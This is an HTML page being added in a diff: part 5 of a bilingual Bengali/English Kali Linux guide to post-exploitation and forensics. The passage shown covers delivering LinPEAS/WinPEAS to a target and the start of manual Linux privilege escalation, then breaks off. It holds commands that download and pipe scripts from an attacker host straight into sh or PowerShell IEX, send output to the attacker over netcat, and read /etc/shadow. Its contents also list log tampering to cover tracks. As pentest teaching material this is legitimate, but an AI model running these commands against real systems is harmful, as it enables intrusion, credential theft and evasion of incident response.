@@ -1,0 +1,1290 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kali Linux Series — Part 5: Post-Exploitation & Forensics</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --primary: #0d1b2a;
+    --green: #2dc653;
+    --teal: #0d9488;
+    --cyan: #06b6d4;
+    --yellow: #ffd60a;
+    --blue: #0077b6;
+    --code-bg: #0d1117;
+    --code-border: #30363d;
+    --text: #1a1a2e;
+    --bg: #f0f2f5;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Hind Siliguri', 'Noto Sans Bengali', sans-serif; background: var(--bg); color: var(--text); font-size: 14px; line-height: 1.9; }
+
+  /* COVER */
+  .cover { background: linear-gradient(135deg, #001a1a 0%, #003333 40%, #001a2e 100%); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 60px 40px; position: relative; overflow: hidden; }
+  .cover::before { content: ''; position: absolute; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 28px, rgba(13,148,136,0.04) 28px, rgba(13,148,136,0.04) 29px); }
+  .cover::after { content: ''; position: absolute; top: -80px; right: -80px; width: 400px; height: 400px; border-radius: 50%; background: radial-gradient(circle, rgba(6,182,212,0.1) 0%, transparent 70%); }
+  .cover-badge { background: rgba(13,148,136,0.18); border: 1px solid rgba(6,182,212,0.4); padding: 6px 20px; border-radius: 20px; font-size: 12px; color: #67e8f9; letter-spacing: 3px; text-transform: uppercase; margin-bottom: 20px; position: relative; }
+  .cover-icon { font-size: 80px; margin-bottom: 15px; position: relative; }
+  .cover h1 { font-size: 40px; font-weight: 700; color: #fff; line-height: 1.2; position: relative; }
+  .cover h1 span { color: #67e8f9; text-shadow: 0 0 30px rgba(6,182,212,0.6); }
+  .cover h2 { font-size: 18px; font-weight: 400; opacity: 0.7; margin: 12px 0 20px; position: relative; }
+  .cover .divider { width: 100px; height: 3px; background: linear-gradient(90deg, #0d9488, #06b6d4); margin: 20px auto; border-radius: 2px; position: relative; }
+  .cover .desc { font-size: 15px; opacity: 0.65; max-width: 620px; line-height: 2; position: relative; }
+  .cover .terminal { background: rgba(0,0,0,0.65); border: 1px solid rgba(13,148,136,0.4); border-radius: 10px; padding: 18px 28px; margin-top: 28px; font-family: 'Courier New', monospace; font-size: 13px; color: #67e8f9; text-align: left; max-width: 560px; position: relative; }
+  .cover .terminal .dot-row { display: flex; gap: 6px; margin-bottom: 14px; }
+  .cover .terminal .dot { width: 10px; height: 10px; border-radius: 50%; }
+  .cover .terminal .dot.r { background: #e63946; } .cover .terminal .dot.y { background: #ffd60a; } .cover .terminal .dot.g { background: #2dc653; }
+  .cover .terminal .prompt { color: #89b4fa; }
+  .cover-tags { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 25px; justify-content: center; position: relative; }
+  .cover-tag { background: rgba(13,148,136,0.15); border: 1px solid rgba(6,182,212,0.2); padding: 5px 14px; border-radius: 15px; font-size: 12px; color: #a5f3fc; }
+  .part-num { font-size: 120px; font-weight: 800; color: rgba(255,255,255,0.03); position: absolute; bottom: 20px; right: 40px; line-height: 1; font-family: 'Courier New', monospace; }
+
+  /* TOC */
+  .toc { background: white; padding: 50px 60px; }
+  .toc-header { font-size: 28px; color: var(--primary); border-bottom: 4px solid var(--teal); padding-bottom: 15px; margin-bottom: 35px; }
+  .toc-main { display: flex; justify-content: space-between; padding: 10px 0; font-weight: 700; font-size: 15px; color: var(--primary); border-bottom: 1px solid #eee; margin-top: 12px; }
+  .toc-main .num { color: var(--teal); margin-right: 10px; font-family: 'Courier New', monospace; }
+  .toc-sub { display: flex; padding: 4px 0 4px 30px; color: #666; font-size: 13px; border-bottom: 1px dotted #f0f0f0; }
+  .toc-tool { display: inline-block; background: #e0f7fa; color: #006064; padding: 1px 8px; border-radius: 8px; font-size: 11.5px; font-family: 'Courier New', monospace; margin: 2px; }
+
+  /* CHAPTERS */
+  .chapter { background: white; margin: 0; page-break-before: always; }
+  .chapter-header { padding: 40px 55px; position: relative; overflow: hidden; }
+  .ch1 .chapter-header { background: linear-gradient(135deg, #001a1a, #004d40); }
+  .ch2 .chapter-header { background: linear-gradient(135deg, #001a2e, #00334d); }
+  .ch3 .chapter-header { background: linear-gradient(135deg, #0d1b2a, #1b3a4b); }
+  .ch4 .chapter-header { background: linear-gradient(135deg, #1a1000, #3d2800); }
+  .ch5 .chapter-header { background: linear-gradient(135deg, #001a0d, #004d26); }
+  .ch6 .chapter-header { background: linear-gradient(135deg, #1a001a, #400040); }
+  .ch7 .chapter-header { background: linear-gradient(135deg, #0d1b2a, #1a3a1a); }
+  .ch8 .chapter-header { background: linear-gradient(135deg, #001a1a, #1a3a3a); }
+  .chapter-header::after { content: ''; position: absolute; top: -40px; right: -40px; width: 180px; height: 180px; border-radius: 50%; background: rgba(255,255,255,0.03); }
+  .chapter-label { font-size: 11px; letter-spacing: 4px; color: #67e8f9; text-transform: uppercase; margin-bottom: 8px; font-family: 'Courier New', monospace; }
+  .chapter-title { font-size: 28px; color: white; font-weight: 700; }
+  .chapter-desc { font-size: 13.5px; color: rgba(255,255,255,0.55); margin-top: 8px; }
+  .chapter-body { padding: 38px 55px; }
+
+  h2.sec { font-size: 21px; color: var(--primary); margin: 35px 0 15px; padding-left: 16px; border-left: 5px solid var(--teal); }
+  h3.sub { font-size: 16.5px; color: #004d40; margin: 25px 0 12px; padding-bottom: 6px; border-bottom: 2px dashed #e0e0e0; }
+  h4.mini { font-size: 14.5px; color: #333; margin: 16px 0 8px; font-weight: 600; }
+  p { margin-bottom: 14px; text-align: justify; }
+
+  /* CODE */
+  .code { background: var(--code-bg); color: #c9d1d9; padding: 18px 22px; border-radius: 10px; font-family: 'Courier New', monospace; font-size: 12.5px; margin: 14px 0; line-height: 1.9; overflow-x: auto; border: 1px solid var(--code-border); border-left: 4px solid var(--teal); }
+  .code .c { color: #6e7681; } .code .k { color: #ff7b72; } .code .s { color: #a5d6ff; }
+  .code .p { color: #89b4fa; } .code .g { color: var(--green); } .code .y { color: #e3b341; }
+  .code .r { color: #ff7b72; } .code .cy { color: #67e8f9; } .code .tl { color: #0d9488; }
+  code { background: #1b2838; color: #67e8f9; padding: 2px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12.5px; }
+
+  /* CMD TABLE */
+  .cmd-table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 13px; }
+  .cmd-table thead tr { background: #001a1a; color: white; }
+  .cmd-table th { padding: 10px 14px; text-align: left; font-weight: 600; }
+  .cmd-table td { padding: 9px 14px; border-bottom: 1px solid #eee; vertical-align: top; }
+  .cmd-table tr:nth-child(even) { background: #f0fdfa; }
+  .cmd-table tr:hover { background: #ccfbf1; }
+  .cmd-table .cmd-cell { font-family: 'Courier New', monospace; color: #0d7377; font-weight: 600; font-size: 12px; white-space: nowrap; }
+  .cmd-table .flag-cell { font-family: 'Courier New', monospace; color: #0d9488; font-size: 12px; }
+  .cmd-table .desc-cell { color: #444; }
+  .cmd-table .ex-cell { font-family: 'Courier New', monospace; font-size: 11.5px; color: #2dc653; background: #f0fff4; padding: 2px 6px; border-radius: 4px; }
+
+  /* BOXES */
+  .box { padding: 16px 20px; border-radius: 10px; margin: 18px 0; border-left: 5px solid; }
+  .info { background: #e8f4fd; border-color: #0077b6; color: #023e8a; }
+  .warn { background: #fff8e6; border-color: #f4831f; color: #7b3f00; }
+  .danger { background: #fde8ea; border-color: #e63946; color: #9b1d20; }
+  .success { background: #e8f8ed; border-color: #2dc653; color: #1a4731; }
+  .teal-box { background: #e0f7fa; border-color: #0d9488; color: #004d40; }
+  .purple-box { background: #f3e8ff; border-color: #7b2d8b; color: #4a0072; }
+  .box-t { font-weight: 700; margin-bottom: 8px; font-size: 14px; }
+
+  table { width: 100%; border-collapse: collapse; margin: 18px 0; font-size: 13px; }
+  thead tr { background: #001a1a; color: white; }
+  th { padding: 11px 14px; text-align: left; font-weight: 600; }
+  td { padding: 9px 14px; border-bottom: 1px solid #eee; }
+  tr:nth-child(even) { background: #f0fdfa; }
+  tr:hover { background: #ccfbf1; }
+
+  .badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 11.5px; font-weight: 600; margin: 2px; }
+  .badge-g { background: #d1e7dd; color: #0f5132; }
+  .badge-r { background: #fde8ea; color: #c1121f; }
+  .badge-y { background: #fff3cd; color: #856404; }
+  .badge-b { background: #cfe2ff; color: #084298; }
+  .badge-p { background: #f3e8ff; color: #4a0072; }
+  .badge-t { background: #ccfbf1; color: #004d40; }
+
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 18px 0; }
+  .grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; margin: 16px 0; }
+  .card { background: #f0fdfa; border: 1px solid #99f6e4; border-radius: 10px; padding: 16px; }
+  .card h4 { color: var(--primary); margin-bottom: 10px; font-size: 14px; border-bottom: 2px solid var(--teal); padding-bottom: 5px; }
+  .card.danger-card { background: #fde8ea; border-color: #e63946; }
+  .card.danger-card h4 { color: #9b1d20; border-color: #e63946; }
+  .card.blue-card { background: #eff6ff; border-color: #3b82f6; }
+  .card.blue-card h4 { color: #1d4ed8; border-color: #3b82f6; }
+  .card.purple-card { background: #f3e8ff; border-color: #7b2d8b; }
+  .card.purple-card h4 { color: #4a0072; border-color: #7b2d8b; }
+  .card.yellow-card { background: #fefce8; border-color: #ca8a04; }
+  .card.yellow-card h4 { color: #713f12; border-color: #ca8a04; }
+
+  .tool-header { display: flex; align-items: center; gap: 16px; background: linear-gradient(135deg, #001a1a, #004d40); color: white; padding: 18px 22px; border-radius: 12px; margin: 25px 0 18px; }
+  .tool-icon { font-size: 36px; }
+  .tool-name { font-size: 22px; font-weight: 700; font-family: 'Courier New', monospace; color: #67e8f9; }
+  .tool-desc { font-size: 13px; color: rgba(255,255,255,0.6); margin-top: 2px; }
+  .tool-badges { display: flex; gap: 6px; margin-top: 6px; flex-wrap: wrap; }
+  .tool-badge { padding: 2px 10px; border-radius: 10px; font-size: 11px; font-weight: 600; }
+  .tb-post { background: rgba(13,148,136,0.3); color: #67e8f9; }
+  .tb-priv { background: rgba(230,57,70,0.2); color: #ff6b6b; }
+  .tb-for { background: rgba(244,131,31,0.2); color: #f4831f; }
+  .tb-net { background: rgba(45,198,83,0.2); color: #2dc653; }
+  .tb-mem { background: rgba(123,45,139,0.25); color: #c77dff; }
+
+  .diagram { background: #0d1117; border: 1px solid #30363d; border-radius: 10px; padding: 20px; font-family: 'Courier New', monospace; font-size: 12.5px; line-height: 1.9; margin: 16px 0; color: #c9d1d9; overflow-x: auto; }
+  .diagram .dg { color: var(--green); } .diagram .dy { color: #e3b341; } .diagram .db { color: #79c0ff; } .diagram .dr { color: #ff7b72; } .diagram .dt { color: #67e8f9; }
+
+  .hl { background: linear-gradient(135deg, #f0fdfa, #ccfbf1); border: 1px solid #0d9488; padding: 14px 18px; border-radius: 8px; margin: 16px 0; }
+  .chapter-summary { background: linear-gradient(135deg, #001a1a, #004d40); color: white; border-radius: 12px; padding: 24px 28px; margin-top: 40px; }
+  .chapter-summary h3 { color: #67e8f9; margin-bottom: 14px; font-size: 17px; }
+  .chapter-summary li { color: rgba(255,255,255,0.82); margin-bottom: 5px; }
+
+  ul, ol { margin: 10px 0 10px 24px; line-height: 2; }
+  li { margin-bottom: 3px; }
+
+  /* DARK MODE */
+  body.light-mode { --bg: #f0f2f5; --text: #1a1a2e; }
+  body.dark-mode { --bg: #0a0f1a; --text: #e2e8f0; }
+  body { background: var(--bg); color: var(--text); transition: background 0.3s, color 0.3s; }
+  body.dark-mode .toc { background: #111827; color: var(--text); }
+  body.dark-mode .chapter { background: #111827; }
+  body.dark-mode .chapter-body { background: #111827; }
+  body.dark-mode h2.sec { color: #67e8f9; }
+  body.dark-mode h3.sub { color: #67e8f9; border-color: #2d3748; }
+  body.dark-mode p { color: var(--text); }
+  body.dark-mode .toc-main { color: #e2e8f0; border-color: #2d3748; }
+  body.dark-mode .toc-header { color: #e2e8f0; }
+  body.dark-mode .toc-sub { color: #94a3b8; }
+  body.dark-mode .toc-tool { background: #003333; color: #67e8f9; }
+  body.dark-mode table { color: var(--text); }
+  body.dark-mode td { border-color: #2d3748; color: var(--text); }
+  body.dark-mode tr:nth-child(even) { background: #0a1a1a; }
+  body.dark-mode tr:hover { background: #003333; }
+  body.dark-mode thead tr { background: #003333; }
+  body.dark-mode .card { background: #0a1a1a; border-color: #1a4d4d; color: var(--text); }
+  body.dark-mode .card h4 { color: #67e8f9; }
+  body.dark-mode .card.danger-card { background: #2a0a0a; border-color: #e63946; }
+  body.dark-mode .card.danger-card h4 { color: #fc8181; }
+  body.dark-mode .card.blue-card { background: #0c1a3d; border-color: #3b82f6; }
+  body.dark-mode .card.blue-card h4 { color: #93c5fd; }
+  body.dark-mode .card.purple-card { background: #1a0a2a; border-color: #7b2d8b; }
+  body.dark-mode .card.purple-card h4 { color: #d8b4fe; }
+  body.dark-mode .card.yellow-card { background: #1a1500; border-color: #ca8a04; }
+  body.dark-mode .card.yellow-card h4 { color: #fbbf24; }
+  body.dark-mode .info { background: #0c2340; color: #90cdf4; }
+  body.dark-mode .warn { background: #2a1500; color: #fdba74; }
+  body.dark-mode .danger { background: #2a0a0a; color: #fc8181; }
+  body.dark-mode .success { background: #0a2a15; color: #6ee7b7; }
+  body.dark-mode .teal-box { background: #003333; color: #67e8f9; }
+  body.dark-mode .purple-box { background: #1a0a2a; color: #d8b4fe; }
+  body.dark-mode .hl { background: #003333; border-color: #0d9488; color: #67e8f9; }
+  body.dark-mode code { background: #1e293b; color: #67e8f9; }
+  body.dark-mode .cmd-table td { border-color: #2d3748; }
+  body.dark-mode .cmd-table tr:nth-child(even) { background: #0a1a1a; }
+  body.dark-mode .cmd-table tr:hover { background: #003333; }
+  body.dark-mode .cmd-table .cmd-cell { color: #67e8f9; }
+  body.dark-mode .cmd-table .desc-cell { color: #cbd5e0; }
+  body.dark-mode .cmd-table .ex-cell { background: #0a2a15; color: #6ee7b7; }
+  body.dark-mode .cmd-table thead tr { background: #003333; }
+
+  /* BILINGUAL */
+  .en-text { display: none; } .bn-text { display: inline; }
+  body.lang-en .bn-text { display: none; } body.lang-en .en-text { display: inline; }
+  .en-block { display: none; } .bn-block { display: block; }
+  body.lang-en .bn-block { display: none; } body.lang-en .en-block { display: block; }
+
+  .top-controls { position: fixed; top: 18px; right: 18px; display: flex; gap: 8px; z-index: 9999; }
+  .ctrl-btn { border: none; padding: 9px 16px; border-radius: 8px; font-size: 13px; font-family: inherit; cursor: pointer; transition: all 0.3s; font-weight: 600; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+  .lang-btn { background: #0077b6; color: white; }
+  .theme-btn { background: #2dc653; color: #0d1b2a; }
+  .print-btn { background: var(--teal); color: white; }
+  .ctrl-btn:hover { transform: translateY(-2px); opacity: 0.9; }
+
+  @media print { .top-controls { display: none; } body { background: white; } .cover, .chapter-header, thead tr { -webkit-print-color-adjust: exact; print-color-adjust: exact; } .code, .diagram { -webkit-print-color-adjust: exact; print-color-adjust: exact; } }
+  @media (max-width: 768px) { .grid2, .grid3 { grid-template-columns: 1fr; } .chapter-body { padding: 24px 20px; } .toc { padding: 30px 24px; } }
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+</style>
+</head>
+<body class="light-mode">
+
+<div class="top-controls">
+  <button class="print-btn ctrl-btn" onclick="window.print()">🖨️ PDF</button>
+  <button class="theme-btn ctrl-btn" onclick="toggleTheme()" id="themeBtn">🌙 Dark Mode</button>
+  <button class="lang-btn ctrl-btn" onclick="toggleLang()" id="langBtn">🇬🇧 English</button>
+</div>
+
+<!-- COVER -->
+<div class="cover">
+  <div class="cover-badge">KALI LINUX SERIES</div>
+  <div class="cover-icon">🔬</div>
+  <h1>Kali Linux — <span>Part 5</span></h1>
+  <h2>
+    <span class="bn-text">Post-Exploitation & Forensics — সম্পূর্ণ বাংলা গাইড</span>
+    <span class="en-text">Post-Exploitation & Forensics — Complete Guide</span>
+  </h2>
+  <div class="divider"></div>
+  <p class="desc">
+    <span class="bn-text">LinPEAS/WinPEAS, Netcat/Socat, Chisel Tunneling, Privilege Escalation techniques, Volatility Memory Forensics, Autopsy Disk Forensics, Log Analysis — Post-Exploitation থেকে Incident Response পর্যন্ত সম্পূর্ণ reference।</span>
+    <span class="en-text">LinPEAS/WinPEAS, Netcat/Socat, Chisel Tunneling, Privilege Escalation, Volatility Memory Forensics, Autopsy, Log Analysis — complete reference from Post-Exploitation to Incident Response.</span>
+  </p>
+  <div class="terminal">
+    <div class="dot-row"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span></div>
+    <div><span class="prompt">root@kali</span>:~# <span style="color:#fff">./linpeas.sh | tee linpeas_out.txt</span></div>
+    <div><span class="prompt">root@kali</span>:~# <span style="color:#fff">volatility -f memory.dmp --profile=Win10x64 pslist</span></div>
+    <div><span class="prompt">root@kali</span>:~# <span style="color:#fff">find / -perm -4000 -type f 2>/dev/null</span></div>
+    <div style="animation: blink 1s infinite; color: #67e8f9;">█</div>
+  </div>
+  <div class="cover-tags">
+    <span class="cover-tag">🐧 LinPEAS</span>
+    <span class="cover-tag">🪟 WinPEAS</span>
+    <span class="cover-tag">📡 Netcat/Socat</span>
+    <span class="cover-tag">🚇 Chisel Tunneling</span>
+    <span class="cover-tag">⬆️ PrivEsc</span>
+    <span class="cover-tag">🧠 Volatility</span>
+    <span class="cover-tag">💽 Autopsy</span>
+    <span class="cover-tag">📋 Log Analysis</span>
+  </div>
+  <div class="part-num">05</div>
+</div>
+
+<!-- TOC -->
+<div class="toc">
+  <div class="toc-header">📋 <span class="bn-text">বিষয়সূচি — Part 5</span><span class="en-text">Table of Contents — Part 5</span></div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">01</span> LinPEAS & WinPEAS — <span class="bn-text">PrivEsc Enumeration</span><span class="en-text">PrivEsc Enumeration</span></span></div>
+    <div class="toc-sub"><span class="bn-text">Automated privilege escalation vector খোঁজা — Linux ও Windows উভয়ের জন্য</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">02</span> <span class="bn-text">Linux Privilege Escalation — Manual Techniques</span></span></div>
+    <div class="toc-sub"><span class="bn-text">SUID/SGID exploit, Sudo misconfiguration, Cron job hijack, PATH injection, Kernel exploit</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">03</span> <span class="bn-text">Windows Privilege Escalation</span></span></div>
+    <div class="toc-sub"><span class="bn-text">Token impersonation, Service misconfiguration, AlwaysInstallElevated, Registry, DLL hijacking</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">04</span> Netcat, Socat & Chisel — <span class="bn-text">Tunneling & Pivoting</span><span class="en-text">Tunneling & Pivoting</span></span></div>
+    <div class="toc-sub"><span class="bn-text">Port forwarding, SOCKS proxy, Network pivoting — সব commands</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">05</span> Volatility — <span class="bn-text">Memory Forensics</span><span class="en-text">Memory Forensics</span></span></div>
+    <div class="toc-sub"><span class="bn-text">RAM dump analysis, Process, Network, Malware detection — সব commands</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">06</span> Autopsy & Sleuth Kit — <span class="bn-text">Disk Forensics</span><span class="en-text">Disk Forensics</span></span></div>
+    <div class="toc-sub"><span class="bn-text">Disk image analysis, Deleted file recovery, Timeline analysis</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">07</span> <span class="bn-text">Log Analysis & Incident Response</span><span class="en-text">Log Analysis & Incident Response</span></span></div>
+    <div class="toc-sub"><span class="bn-text">Linux logs, journalctl, Compromised system check, Evidence collection</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">08</span> <span class="bn-text">আক্রান্ত System থেকে নিজেকে মুছে ফেলো</span><span class="en-text">Covering Tracks</span></span></div>
+    <div class="toc-sub"><span class="bn-text">History clear, Log tamper, File timestamp modify, Persistence remove</span></div>
+  </div>
+</div>
+
+<!-- CH1: LINPEAS / WINPEAS -->
+<div class="chapter ch1">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 01</div>
+    <div class="chapter-title">🐧 LinPEAS & WinPEAS — <span class="bn-text">Automated PrivEsc Enumeration</span><span class="en-text">Automated PrivEsc Enumeration</span></div>
+    <div class="chapter-desc"><span class="bn-text">Target system-এ privilege escalation-এর সব vector automatically খুঁজে বের করো</span><span class="en-text">Automatically find all privilege escalation vectors on target system</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="tool-header">
+      <div class="tool-icon">🐛</div>
+      <div>
+        <div class="tool-name">linpeas.sh / winpeas.exe</div>
+        <div class="tool-desc"><span class="bn-text">PEASS-ng suite — Linux ও Windows-এ PrivEsc vector automatically scan করে color-coded output দেয়</span><span class="en-text">PEASS-ng suite — automatically scans Linux and Windows for PrivEsc vectors with color-coded output</span></div>
+        <div class="tool-badges">
+          <span class="tool-badge tb-priv">PrivEsc Scan</span>
+          <span class="tool-badge tb-post">Enumeration</span>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">🐧 LinPEAS — <span class="bn-text">Target-এ Deliver ও Run করো</span><span class="en-text">Deliver & Run on Target</span></h2>
+    <div class="code">
+<span class="c">═══ Method 1: Attacker থেকে HTTP server দিয়ে transfer করো ═══</span>
+<span class="c"># Attacker machine-এ (linpeas.sh আছে সেই folder-এ):</span>
+<span class="p">root@kali</span>:~# <span class="g">python3 -m http.server 8080</span>
+
+<span class="c"># Target machine-এ download করো ও চালাও:</span>
+target$ <span class="g">wget http://192.168.1.100:8080/linpeas.sh -O /tmp/linpeas.sh</span>
+target$ <span class="g">chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh</span>
+
+<span class="c">═══ Method 2: Curl দিয়ে সরাসরি run করো (disk-এ save ছাড়া) ═══</span>
+target$ <span class="g">curl 192.168.1.100:8080/linpeas.sh | sh</span>
+
+<span class="c">═══ Method 3: GitHub থেকে সরাসরি ═══</span>
+target$ <span class="g">curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</span>
+
+<span class="c">═══ Output file-এ save করো (পরে analyze করার জন্য) ═══</span>
+target$ <span class="g">./linpeas.sh | tee /tmp/linpeas_output.txt</span>
+
+<span class="c">═══ Attacker-এ output পাঠাও (nc দিয়ে) ═══</span>
+<span class="c"># Attacker-এ:</span>
+<span class="p">root@kali</span>:~# <span class="g">nc -lvnp 9001 | tee linpeas_result.txt</span>
+<span class="c"># Target-এ:</span>
+target$ <span class="g">./linpeas.sh | nc 192.168.1.100 9001</span>
+    </div>
+
+    <h2 class="sec">⚙️ LinPEAS — <span class="bn-text">Flags ও Options</span><span class="en-text">Flags & Options</span></h2>
+    <table class="cmd-table">
+      <thead><tr><th>Flag</th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th></tr></thead>
+      <tbody>
+        <tr><td class="flag-cell">-a</td><td class="desc-cell"><span class="bn-text">সব checks চালাও (slow কিন্তু thorough)</span><span class="en-text">Run all checks (slow but thorough)</span></td></tr>
+        <tr><td class="flag-cell">-s</td><td class="desc-cell"><span class="bn-text">Super fast mode (কম check)</span><span class="en-text">Super fast mode (fewer checks)</span></td></tr>
+        <tr><td class="flag-cell">-o section</td><td class="desc-cell"><span class="bn-text">শুধু নির্দিষ্ট section চালাও (SysI, UsrI, SofI, NetI, FilI, ProI)</span><span class="en-text">Run only specific section</span></td></tr>
+        <tr><td class="flag-cell">-d</td><td class="desc-cell"><span class="bn-text">Extra checks — directory permissions ইত্যাদি</span><span class="en-text">Extra checks — directory permissions etc.</span></td></tr>
+        <tr><td class="flag-cell">-D</td><td class="desc-cell"><span class="bn-text">Debug mode</span><span class="en-text">Debug mode</span></td></tr>
+        <tr><td class="flag-cell">-P password</td><td class="desc-cell"><span class="bn-text">Current user password দাও (sudo check-এর জন্য)</span><span class="en-text">Provide current user password (for sudo checks)</span></td></tr>
+        <tr><td class="flag-cell">-q</td><td class="desc-cell"><span class="bn-text">Quiet mode — কম noise</span><span class="en-text">Quiet mode — less noise</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🏷️ <span class="bn-text">LinPEAS Output Color Code</span><span class="en-text">LinPEAS Output Color Codes</span></h2>
+    <div class="grid2">
+      <div class="card danger-card">
+        <h4>🔴 Red/Yellow — Critical!</h4>
+        <p style="font-size:13px;"><span class="bn-text">Highly probable PE vector — সবার আগে এগুলো দেখো। SUID files, writable paths, sudo misconfigs।</span><span class="en-text">Highly probable PE vector — look at these first. SUID files, writable paths, sudo misconfigs.</span></p>
+      </div>
+      <div class="card yellow-card">
+        <h4>🟡 Yellow — Interesting</h4>
+        <p style="font-size:13px;"><span class="bn-text">Interesting information — manually check করো। Config files, cron jobs, network info।</span><span class="en-text">Interesting info — check manually. Config files, cron jobs, network info.</span></p>
+      </div>
+      <div class="card blue-card">
+        <h4>🔵 Blue — Info</h4>
+        <p style="font-size:13px;"><span class="bn-text">General system info — reference হিসেবে রাখো।</span><span class="en-text">General system info — keep for reference.</span></p>
+      </div>
+      <div class="card">
+        <h4>⚪ White — Normal</h4>
+        <p style="font-size:13px;"><span class="bn-text">Normal/expected output — সাধারণত ignore করো।</span><span class="en-text">Normal/expected output — generally ignore.</span></p>
+      </div>
+    </div>
+
+    <h2 class="sec">🪟 WinPEAS — <span class="bn-text">Windows PrivEsc Enumeration</span><span class="en-text">Windows PrivEsc Enumeration</span></h2>
+    <div class="code">
+<span class="c"># Target Windows-এ transfer করো (SMB দিয়ে)</span>
+<span class="p">root@kali</span>:~# <span class="g">impacket-smbserver share /opt/tools -smb2support</span>
+<span class="c"># Windows target-এ:</span>
+<span class="cy">C:\></span> <span class="g">copy \\192.168.1.100\share\winpeas.exe C:\Windows\Temp\</span>
+<span class="cy">C:\></span> <span class="g">cd C:\Windows\Temp && winpeas.exe</span>
+
+<span class="c"># PowerShell দিয়ে download করো</span>
+<span class="cy">PS C:\></span> <span class="g">IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/winpeasany.exe')</span>
+
+<span class="c"># নির্দিষ্ট category চালাও</span>
+<span class="cy">C:\></span> <span class="g">winpeas.exe systeminfo</span>
+<span class="cy">C:\></span> <span class="g">winpeas.exe userinfo</span>
+<span class="cy">C:\></span> <span class="g">winpeas.exe servicesinfo</span>
+<span class="cy">C:\></span> <span class="g">winpeas.exe applicationsinfo</span>
+<span class="cy">C:\></span> <span class="g">winpeas.exe networkinfo</span>
+<span class="cy">C:\></span> <span class="g">winpeas.exe windowscreds</span>
+
+<span class="c"># Output file-এ save করো</span>
+<span class="cy">C:\></span> <span class="g">winpeas.exe > C:\Windows\Temp\winpeas_out.txt 2>&1</span>
+
+<span class="c"># Quiet mode</span>
+<span class="cy">C:\></span> <span class="g">winpeas.exe quiet</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH2: LINUX PRIVESC -->
+<div class="chapter ch2">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 02</div>
+    <div class="chapter-title">⬆️ Linux Privilege Escalation — <span class="bn-text">Manual Techniques</span><span class="en-text">Manual Techniques</span></div>
+    <div class="chapter-desc"><span class="bn-text">SUID, Sudo, Cron, PATH, Kernel — Linux-এ root পাওয়ার সব পদ্ধতি</span><span class="en-text">SUID, Sudo, Cron, PATH, Kernel — all methods to gain root on Linux</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🔍 <span class="bn-text">Initial Enumeration — প্রথমে কী দেখব</span><span class="en-text">Initial Enumeration — What to Check First</span></h2>
+    <div class="code">
+<span class="c"># Basic system info</span>
+target$ <span class="g">id && whoami</span>                         <span class="c"># বর্তমান user</span>
+target$ <span class="g">uname -a</span>                             <span class="c"># Kernel version</span>
+target$ <span class="g">cat /etc/os-release</span>                  <span class="c"># OS version</span>
+target$ <span class="g">cat /etc/passwd</span>                      <span class="c"># সব users</span>
+target$ <span class="g">cat /etc/shadow</span>                      <span class="c"># Password hashes (root দরকার)</span>
+target$ <span class="g">sudo -l</span>                               <span class="c"># Sudo permissions দেখো</span>
+target$ <span class="g">env</span>                                   <span class="c"># Environment variables</span>
+target$ <span class="g">history</span>                               <span class="c"># Command history</span>
+target$ <span class="g">ls -la /home/</span>                         <span class="c"># Other users' home</span>
+target$ <span class="g">cat /etc/crontab</span>                     <span class="c"># Cron jobs</span>
+target$ <span class="g">ls -la /etc/cron*</span>                    <span class="c"># All cron files</span>
+target$ <span class="g">ps aux</span>                                <span class="c"># Running processes</span>
+target$ <span class="g">netstat -tulnp 2>/dev/null || ss -tulnp</span> <span class="c"># Open ports</span>
+    </div>
+
+    <h2 class="sec">🔑 SUID/SGID — <span class="bn-text">Exploit করো</span><span class="en-text">Exploit</span></h2>
+    <div class="box teal-box">
+      <div class="box-t">💡 SUID কী?</div>
+      <span class="bn-text">SUID (Set User ID) bit set থাকা file execute হলে file owner-এর permission-এ চলে। যদি root-owned SUID file থাকে এবং সেটা exploitable হয়, তাহলে root shell পাওয়া সম্ভব।</span>
+      <span class="en-text">Files with SUID bit run with the permissions of the file owner. If a root-owned SUID file is exploitable, you can get a root shell.</span>
+    </div>
+    <div class="code">
+<span class="c"># SUID files খোঁজো</span>
